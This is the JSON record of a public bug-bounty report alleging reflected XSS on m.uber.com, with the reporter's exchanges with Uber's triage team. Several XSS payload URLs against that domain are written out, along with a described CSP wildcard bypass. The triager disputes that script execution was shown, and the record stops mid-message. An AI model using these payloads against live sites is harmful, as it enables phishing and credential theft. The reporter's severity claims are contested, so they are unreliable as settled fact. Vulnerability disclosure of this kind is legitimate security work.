{"id":296701,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTY3MDE=","url":"https://hackerone.com/reports/296701","title":"SSL-protected Reflected XSS in m.uber.com","state":"Closed","substate":"duplicate","severity_rating":"critical","readable_substate":"Duplicate","created_at":"2017-12-10T18:06:43.055Z","submitted_at":"2017-12-10T18:06:43.055Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"gregoryvperry","url":"/gregoryvperry","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":314,"url":"https://hackerone.com/uber","handle":"uber","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Uber","twitter_handle":"","website":"https://www.uber.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-12-26T11:03:42.453Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-12-24T20:46:17.028Z","comments_closed?":true,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary\nm.uber.com is susceptible to reflected XSS\n\n## Security Impact\nA malformed URL can be used to render arbitrary SSL-protected web pages from m.uber.com\n\n## Reproduction Steps\nhttps://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1\n\n## Specifics\nFrom the rendered web page:\n```\n{\"enabled\":true,\"sid\":\"bbc661585c424072\",\"url\":\"www.cdn-net.com\",\"cf\":1022963},\"queryParams\":{\"bjbxm\u003c/script\u003e\u003cscript\u003ealert(1)\u003c/script\u003exrii5\":\"1\"}\n```\nNo further efforts were made to render a more believable webpage as the vulnerability and reflected code above is sufficient to trigger Chromium Browser's XSS _Auditor protections.\n\n## Impact\n\nAn attacker could render arbitrary SSL-protected web pages from m.uber.com, to capture user login credentials and passwords, credit card numbers and related payment information, etc.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary\u003c/h2\u003e\n\n\u003cp\u003em.uber.com is susceptible to reflected XSS\u003c/p\u003e\n\n\u003ch2 id=\"security-impact\"\u003eSecurity Impact\u003c/h2\u003e\n\n\u003cp\u003eA malformed URL can be used to render arbitrary SSL-protected web pages from m.uber.com\u003c/p\u003e\n\n\u003ch2 id=\"reproduction-steps\"\u003eReproduction Steps\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"https://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1\" href=\"/redirect?url=https%3A%2F%2Fm.uber.com%2F%3Fbjbxm%253c%252fscript%253e%253cscript%253ealert%281%29%253c%252fscript%253exrii5%3D1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"specifics\"\u003eSpecifics\u003c/h2\u003e\n\n\u003cp\u003eFrom the rendered web page:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;enabled\u0026quot;:true,\u0026quot;sid\u0026quot;:\u0026quot;bbc661585c424072\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;www.cdn-net.com\u0026quot;,\u0026quot;cf\u0026quot;:1022963},\u0026quot;queryParams\u0026quot;:{\u0026quot;bjbxm\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;xrii5\u0026quot;:\u0026quot;1\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNo further efforts were made to render a more believable webpage as the vulnerability and reflected code above is sufficient to trigger Chromium Browser\u0026#39;s XSS _Auditor protections.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker could render arbitrary SSL-protected web pages from m.uber.com, to capture user login credentials and passwords, credit card numbers and related payment information, etc.\u003c/p\u003e\n","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":276134,"original_report_url":"https://hackerone.com/reports/276134","attachments":[],"allow_singular_disclosure_at":null,"vote_count":3,"voters":["fa1rlight","muhammad_uwais","gregoryvperry"],"severity":{"rating":"critical","score":10.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"none"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2214576,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We'll take a look and follow-up when we've got more details.","markdown_message":"\u003cp\u003eWe\u0026#39;ll take a look and follow-up when we\u0026#39;ve got more details.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-11T15:42:37.976Z","updated_at":"2017-12-11T15:42:37.976Z","actor":{"username":"fletcher","cleared":false,"url":"/fletcher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/090/8b777383ddc3ab23063609c8beb1cb1f689a75c1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2226707,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"In our testing, JavaScript execution is not possible because quotes are properly escaped -- do you have a PoC that actually demonstrates XSS?","markdown_message":"\u003cp\u003eIn our testing, JavaScript execution is not possible because quotes are properly escaped -- do you have a PoC that actually demonstrates XSS?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-15T17:55:37.957Z","updated_at":"2017-12-15T17:55:37.957Z","actor":{"username":"fletcher","cleared":false,"url":"/fletcher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/090/8b777383ddc3ab23063609c8beb1cb1f689a75c1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2227782,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hello Rob,\n\nReally trying to avoid this scenario based upon the last three reports being closed due to \"we knew about this issue already\" etc. It would also appear that changes have already been made to the backend application associated with the reported link above, as the response I am getting now after testing that link differs from the original responses that I have cached here locally from m.uber.com.\n\nThis particular attack vector is still sufficient to trigger the XSS_Auditor protections of Chromium Browser, but only on Linux - my Windows 10 box renders the injected frame without issue.\n\nI will research the issue more this weekend to generate a more palatable POC.\n\nIt would be great if you could direct your development staff to hold off on making any application changes during that period.","markdown_message":"\u003cp\u003eHello Rob,\u003c/p\u003e\n\n\u003cp\u003eReally trying to avoid this scenario based upon the last three reports being closed due to \u0026quot;we knew about this issue already\u0026quot; etc. It would also appear that changes have already been made to the backend application associated with the reported link above, as the response I am getting now after testing that link differs from the original responses that I have cached here locally from m.uber.com.\u003c/p\u003e\n\n\u003cp\u003eThis particular attack vector is still sufficient to trigger the XSS_Auditor protections of Chromium Browser, but only on Linux - my Windows 10 box renders the injected frame without issue.\u003c/p\u003e\n\n\u003cp\u003eI will research the issue more this weekend to generate a more palatable POC.\u003c/p\u003e\n\n\u003cp\u003eIt would be great if you could direct your development staff to hold off on making any application changes during that period.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-15T20:25:11.886Z","updated_at":"2017-12-15T20:25:11.886Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2228140,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Is uberinternal.com in scope for testing. It frequently shows up in various uber.com domains but is not specifically referenced as in scope for the Uber Bug Bounty.","markdown_message":"\u003cp\u003eIs uberinternal.com in scope for testing. It frequently shows up in various uber.com domains but is not specifically referenced as in scope for the Uber Bug Bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-15T22:14:41.455Z","updated_at":"2017-12-15T22:14:41.455Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2228166,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sounds good -- we'll keep an eye out for the new PoC.\n\nFor scope details, we focus on security impact buckets -- if a given vulnerability report lands in one of those buckets (and doesn't have mitigating factors that result in security impact being negligible) they are in-scope. We have a small list of out-of-scope domains, but we don't define a list of in-scope domains as we believe that model isn't an accurate way to understand the security impact of any given report.","markdown_message":"\u003cp\u003eSounds good -- we\u0026#39;ll keep an eye out for the new PoC.\u003c/p\u003e\n\n\u003cp\u003eFor scope details, we focus on security impact buckets -- if a given vulnerability report lands in one of those buckets (and doesn\u0026#39;t have mitigating factors that result in security impact being negligible) they are in-scope. We have a small list of out-of-scope domains, but we don\u0026#39;t define a list of in-scope domains as we believe that model isn\u0026#39;t an accurate way to understand the security impact of any given report.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-15T22:30:17.915Z","updated_at":"2017-12-15T22:30:17.915Z","actor":{"username":"fletcher","cleared":false,"url":"/fletcher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/090/8b777383ddc3ab23063609c8beb1cb1f689a75c1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2233468,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I am not seeing how quotes are escaped at this https://m.uber.com endpoint. In fact, any arbitrary input can be reflected after the query string and I've been able to close out the originating script with a crafted urlencoded \u003c/script\u003e tag. I have not yet been able to generate an alert which may be due to content sniffing in the browser, but I don't think so as the page itself is content type text/html. Don't close out this report as I am still working on some other options.\n\n","markdown_message":"\u003cp\u003eI am not seeing how quotes are escaped at this \u003ca title=\"https://m.uber.com\" href=\"/redirect?url=https%3A%2F%2Fm.uber.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://m.uber.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e endpoint. In fact, any arbitrary input can be reflected after the query string and I\u0026#39;ve been able to close out the originating script with a crafted urlencoded \u0026lt;/script\u0026gt; tag. I have not yet been able to generate an alert which may be due to content sniffing in the browser, but I don\u0026#39;t think so as the page itself is content type text/html. Don\u0026#39;t close out this report as I am still working on some other options.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-19T03:14:33.971Z","updated_at":"2017-12-19T03:14:33.971Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2242627,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"m.uber.com is definitely vulnerable. Although the page has content sniffing enabled, the content type is text/html which gives me the ability to inject a \u003c/script\u003e tag into the query string followed by rendering of arbitrary javascript and/or html.\n\nhttps://m.uber.com/?\u003c/ScrIpt\u003e\u003cscript\u003ealert(1)\u003c/script\u003e \nhttps://m.uber.com/?\u003c/ScrIpt\u003e\u003cscript\u003e(/X/)\u003c/script\u003e\n\ngenerates a javascript popup in Trident and Webkit-based browsers, triggers XSS_Auditor in Chrome, triggers Internet Explorer's XSS protections, and is being rendered in the resulting html document without any escaping:\n```\n{\"fb\":\"lite:os6DDzUYcFwRIHl9FUCbrBhmasr78yA9\"},\"fbAppId\":\"277064115737714\",\"fbSDKVersion\":\"v2.6\",\"deferredSignUp\":true,\"enabledFeatures\":{\"promotionsEnabled\":true},\"pageCreatedAt\":1513958970175,\"uditoken\":{\"enabled\":true,\"sid\":\"bbc661585c424072\",\"url\":\"www.cdn-net.com\",\"cf\":1022963},\"queryParams\":{\"\u003c/ScrIpt\u003e\u003cscript\u003e(/X/)\u003c/script\u003e\":\"\"},\"useragent\":{\"ua\":\"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 \n```","markdown_message":"\u003cp\u003em.uber.com is definitely vulnerable. Although the page has content sniffing enabled, the content type is text/html which gives me the ability to inject a \u0026lt;/script\u0026gt; tag into the query string followed by rendering of arbitrary javascript and/or html.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://m.uber.com/\" href=\"/redirect?url=https%3A%2F%2Fm.uber.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://m.uber.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e?\u0026lt;/ScrIpt\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; \u003cbr\u003e\n\u003ca title=\"https://m.uber.com/\" href=\"/redirect?url=https%3A%2F%2Fm.uber.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://m.uber.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e?\u0026lt;/ScrIpt\u0026gt;\u0026lt;script\u0026gt;(/X/)\u0026lt;/script\u0026gt;\u003c/p\u003e\n\n\u003cp\u003egenerates a javascript popup in Trident and Webkit-based browsers, triggers XSS_Auditor in Chrome, triggers Internet Explorer\u0026#39;s XSS protections, and is being rendered in the resulting html document without any escaping:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;fb\u0026quot;:\u0026quot;lite:os6DDzUYcFwRIHl9FUCbrBhmasr78yA9\u0026quot;},\u0026quot;fbAppId\u0026quot;:\u0026quot;277064115737714\u0026quot;,\u0026quot;fbSDKVersion\u0026quot;:\u0026quot;v2.6\u0026quot;,\u0026quot;deferredSignUp\u0026quot;:true,\u0026quot;enabledFeatures\u0026quot;:{\u0026quot;promotionsEnabled\u0026quot;:true},\u0026quot;pageCreatedAt\u0026quot;:1513958970175,\u0026quot;uditoken\u0026quot;:{\u0026quot;enabled\u0026quot;:true,\u0026quot;sid\u0026quot;:\u0026quot;bbc661585c424072\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;www.cdn-net.com\u0026quot;,\u0026quot;cf\u0026quot;:1022963},\u0026quot;queryParams\u0026quot;:{\u0026quot;\u0026lt;/ScrIpt\u0026gt;\u0026lt;script\u0026gt;(/X/)\u0026lt;/script\u0026gt;\u0026quot;:\u0026quot;\u0026quot;},\u0026quot;useragent\u0026quot;:{\u0026quot;ua\u0026quot;:\u0026quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-12-22T16:10:38.654Z","updated_at":"2017-12-22T16:10:38.654Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2242640,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"m.uber.com also has script-src set which can be bypassed due to the *.cloudfront.net wildcard (I could simply enable Cloudfront in my AWS console and then inject files from the *.cloudfront.net host I control), in addition to a missing base-uri which are both considered high severity findings under Content Security Policy 3.","markdown_message":"\u003cp\u003em.uber.com also has script-src set which can be bypassed due to the *.cloudfront.net wildcard (I could simply enable Cloudfront in my AWS console and then inject files from the *.cloudfront.net host I control), in addition to a missing base-uri which are both considered high severity findings under Content Security Policy 3.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-22T16:19:01.834Z","updated_at":"2017-12-22T16:19:01.834Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2242679,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Another valid payload:\n\nhttps://m.uber.com/?%3C/ScrIpt%3E%3Cscript%3E(/X/)%3C/script%3E\n\nResulting in:\n\n```\nledFeatures\":{\"promotionsEnabled\":true},\"pageCreatedAt\":1513960039898,\"uditoken\":{\"enabled\":true,\"sid\":\"bbc661585c424072\",\"url\":\"www.cdn-net.com\",\"cf\":1022963},\"queryParams\":{\"\\\"\u003e\u003c/script\u003e\u003cscript\u003e/*\\\"/*'/**/;alert(1)//\u003c/script\u003e\":\"\"},\"useragent\":{\"ua\":\"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 \n```\n\nValid \u003c/script\u003e with arbitrary javascript injection that is not escaped.\n\n","markdown_message":"\u003cp\u003eAnother valid payload:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://m.uber.com/?%3C/ScrIpt%3E%3Cscript%3E(/X/)%3C/script%3E\" href=\"/redirect?url=https%3A%2F%2Fm.uber.com%2F%3F%253C%2FScrIpt%253E%253Cscript%253E%28%2FX%2F%29%253C%2Fscript%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://m.uber.com/?%3C/ScrIpt%3E%3Cscript%3E(/X/)%3C/script%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eResulting in:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eledFeatures\u0026quot;:{\u0026quot;promotionsEnabled\u0026quot;:true},\u0026quot;pageCreatedAt\u0026quot;:1513960039898,\u0026quot;uditoken\u0026quot;:{\u0026quot;enabled\u0026quot;:true,\u0026quot;sid\u0026quot;:\u0026quot;bbc661585c424072\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;www.cdn-net.com\u0026quot;,\u0026quot;cf\u0026quot;:1022963},\u0026quot;queryParams\u0026quot;:{\u0026quot;\\\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;/*\\\u0026quot;/*\u0026#39;/**/;alert(1)//\u0026lt;/script\u0026gt;\u0026quot;:\u0026quot;\u0026quot;},\u0026quot;useragent\u0026quot;:{\u0026quot;ua\u0026quot;:\u0026quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eValid \u0026lt;/script\u0026gt; with arbitrary javascript injection that is not escaped.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-22T16:29:20.200Z","updated_at":"2017-12-22T16:29:20.200Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2242681,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Another valid payload:\n\nhttps://m.uber.com/?\"\u003e\u003c/script \"/*'/*\u003e\u003cimg/src=x */; onerror=alert(1) //\n\nResulting in:\n\n```\n{\"enabled\":true,\"sid\":\"bbc661585c424072\",\"url\":\"www.cdn-net.com\",\"cf\":1022963},\"queryParams\":{\"\\\"\u003e\u003c/script \\\"/*'/*\u003e\u003cimg/src\":\"x */; onerror=alert(1) //\"},\"useragent\":{\"ua\":\"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0\",\"browser\":\n```\n\n","markdown_message":"\u003cp\u003eAnother valid payload:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://m.uber.com/?%22%3E\" href=\"/redirect?url=https%3A%2F%2Fm.uber.com%2F%3F%2522%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://m.uber.com/?%22%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026lt;/script \u0026quot;/*\u0026#39;/*\u0026gt;\u0026lt;img/src=x */; onerror=alert(1) //\u003c/p\u003e\n\n\u003cp\u003eResulting in:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;enabled\u0026quot;:true,\u0026quot;sid\u0026quot;:\u0026quot;bbc661585c424072\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;www.cdn-net.com\u0026quot;,\u0026quot;cf\u0026quot;:1022963},\u0026quot;queryParams\u0026quot;:{\u0026quot;\\\u0026quot;\u0026gt;\u0026lt;/script \\\u0026quot;/*\u0026#39;/*\u0026gt;\u0026lt;img/src\u0026quot;:\u0026quot;x */; onerror=alert(1) //\u0026quot;},\u0026quot;useragent\u0026quot;:{\u0026quot;ua\u0026quot;:\u0026quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0\u0026quot;,\u0026quot;browser\u0026quot;:\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-12-22T16:31:35.722Z","updated_at":"2017-12-22T16:31:35.722Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2242931,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for another one, @gregperry. We're looking into this now and will follow up as we have more details.","markdown_message":"\u003cp\u003eThanks for another one, \u003ca href=\"/gregperry\"\u003e@gregperry\u003c/a\u003e. We\u0026#39;re looking into this now and will follow up as we have more details.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-22T18:00:56.630Z","updated_at":"2017-12-22T18:00:56.630Z","actor":{"username":"lindsey-uber","cleared":false,"url":"/lindsey-uber","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2243055,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This application's XSS filtering attempts to escape double quotes, but allows single quotes which is valid html.\n\nHere is an example of generating some arbitrary text using single quotes, all SSL-encrypted with Uber's signed certificate, and without Chrome's XSS_Auditor triggering:\n\nhttps://m.uber.com/?asdf\"}}\u003c/script\u003e\u003cdiv%20class%3D%27_b%20_c%20_d%20_e%20_f%20_g%20_h%20_i%20_a3%20_a4%20_a5%20_a6%20_a7%20_a8%20_a9%20_aa%20_ab%20_ac%20_ad%20_ae%20_af%20_ag%20_ah%20_ai%20_aj%20_ak%20_al%20_am%20_an%20_ao%20_ap%20_aq%20_ar%20_as%20_at%20_au%20_av%20_aw%27\u003e\u003ca%20href%3D\"http%3A%2F%2Fwww.lyft.com\"\u003eSome%20arbitrary%20link%20text\u003c%2Fa\u003e\u003c%2Fdiv\u003e%0A\n\nI trust this issue, at the very least, is now validated as a critical security vulnerability.","markdown_message":"\u003cp\u003eThis application\u0026#39;s XSS filtering attempts to escape double quotes, but allows single quotes which is valid html.\u003c/p\u003e\n\n\u003cp\u003eHere is an example of generating some arbitrary text using single quotes, all SSL-encrypted with Uber\u0026#39;s signed certificate, and without Chrome\u0026#39;s XSS_Auditor triggering:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://m.uber.com/?asdf%22%7D\" href=\"/redirect?url=https%3A%2F%2Fm.uber.com%2F%3Fasdf%2522%257D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://m.uber.com/?asdf%22%7D\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e}\u0026lt;/script\u0026gt;\u0026lt;div%20class%3D%27_b%20_c%20_d%20_e%20_f%20_g%20_h%20_i%20_a3%20_a4%20_a5%20_a6%20_a7%20_a8%20_a9%20_aa%20_ab%20_ac%20_ad%20_ae%20_af%20_ag%20_ah%20_ai%20_aj%20_ak%20_al%20_am%20_an%20_ao%20_ap%20_aq%20_ar%20_as%20_at%20_au%20_av%20_aw%27\u0026gt;\u0026lt;a%20href%3D\u0026quot;http%3A%2F%2Fwww.lyft.com\u0026quot;\u0026gt;Some%20arbitrary%20link%20text\u0026lt;%2Fa\u0026gt;\u0026lt;%2Fdiv\u0026gt;%0A\u003c/p\u003e\n\n\u003cp\u003eI trust this issue, at the very least, is now validated as a critical security vulnerability.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-22T18:44:13.530Z","updated_at":"2017-12-22T18:44:13.530Z","actor":{"username":"gregoryvperry","cleared":false,"url":"/gregoryvperry","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243133,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We'll take a look into this one more time, but so far this is not a security bug that is in scope -- you've failed to demonstrate Javascript execution in a modern browser and the other behavior you allude to with \"generating some arbitrary text using single quotes\" sounds like simple content injection, which is out of scope for our program.\n\nPlease refrain from making theoretical arguments for why something has security impact and instead familiarize yourself with our scope page and demonstrate actual security impact that is in scope per our guidelines.","markdown_message":"\u003cp\u003eWe\u0026#39;ll take a look into this one more time, but so far this is not a security bug that is in scope -- you\u0026#39;ve failed to demonstrate Javascript execution in a modern browser and the other behavior you allude to with \u0026quot;generating some arbitrary text using single quotes\u0026quot; sounds like simple content injection, which is out of scope for our program.\u003c/p\u003e\n\n\u003cp\u003ePlease refrain from making theoretical arguments for why something has security impact and instead familiarize yourself with our scope page and demonstrate actual security impact that is in scope per our guidelines.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-22T19:07:39.449Z","updated_at":"2017-12-22T19:07:39.449Z","actor":{"username":"fletcher","cleared":false,"url":"/fletcher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/090/8b777383ddc3ab23063609c8beb1cb1f689a75c1_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2243205,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello Rob,\n\nThis is reflected XSS, and certainly in scope. For example, here is the Uber sample report:\n\n```\n## Summary\nreflected XSS in partners.uber.com\n\n## Security Impact\nSince partners.uber.com has an authenticated experience, an XSS in this domain\nmeans an attacker can forge authenticated requests on behalf of the victim.\nAlso, advanced phishing attacks and defacement are possible.\n\n## Reproduction Steps\nThis is a reflected XSS in `partners.uber.com/ via the `lang` querystring\nparameter via the route `/documents`.\n```\nThis particular issue is almost word-for-word the same as your sample vulnerability report, with a POC that executes arbitrary html from an SSL-protected Uber website, so I don't know how you could possibly say this is not in scope unless you are just engaging in blatant employment discrimination at this point.\n","markdown_message":"\u003cp\u003eHello Rob,\u003c/p\u003e\n\n\u003cp\u003eThis is reflected XSS, and certainly in 